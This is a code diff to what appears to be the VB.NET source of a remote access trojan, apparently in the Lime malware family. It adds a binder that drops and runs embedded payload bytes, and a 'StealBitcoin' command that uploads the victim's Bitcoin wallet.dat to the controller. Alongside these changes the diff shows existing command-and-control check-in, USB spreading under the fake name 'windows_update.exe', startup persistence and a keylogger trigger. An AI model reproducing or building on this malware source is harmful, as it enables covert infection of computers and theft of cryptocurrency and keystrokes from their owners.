@@ -42,6 +42,11 @@ Public Class Form1
     Public WatcherStatus As String = "[Watcher_Status]"
     Public WatcherBytes As String = "[Watcher_Bytes]"
     Public DropBoxSpreadd As String = "[DropBox_Spread]"
+    Public BinderStatus As String = "[BinderStatus]"
+    Public BinderBytes As String = "[BinderBytes]"
+    Public DropperPath As String = "[DropperPath]"
+    Public BinderSleep As String = "[BinderSleep]"
+    Public DropperName As String = "[DropperName]"
     Public st As Integer = 0
     Public Y As String = "|BN|"
     Public trd As Thread
@@ -89,10 +94,21 @@ Public Class Form1
             C.Connect()
             C.Send("Online")
 
+
+
             If checkBlacklist() = True Then
                 C.Send("Uninstall")
                 DStartup(StartName)
                 Application.Exit()
+            End If
+
+            If BinderStatus = "True" Then
+                Dim Binder As New Binder
+                Binder.BinderBytes = BinderBytes
+                Binder.DropperName = DropperName
+                Binder.DropperPath = DropperPath
+                Binder.BinderSleep = BinderSleep
+                Binder.StartBinder()
             End If
 
             If Startup = "True" Then
@@ -112,7 +128,7 @@ Public Class Form1
             End If
 
             If USBSpread = "True" Then
-                Dim USB As USB = New USB
+                Dim USB As New USBSpread
                 USB.ExeName = "windows_update.exe"
                 USB.Start()
             End If
@@ -414,6 +430,15 @@ Public Class Form1
                         ProgramList()
                         C.Upload(TempPath & "\\ProgramList.txt")
                         C.Send("CleanCommands")
+
+                    Case "StealBitcoin"
+                        If (File.Exists(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))) Then
+                            C.Upload(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))
+                            C.Send("CleanCommands")
+                        Else
+                            C.Send("CleanCommands")
+                            Return
+                        End If
 
                     Case "StartKeylogger"
                         Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
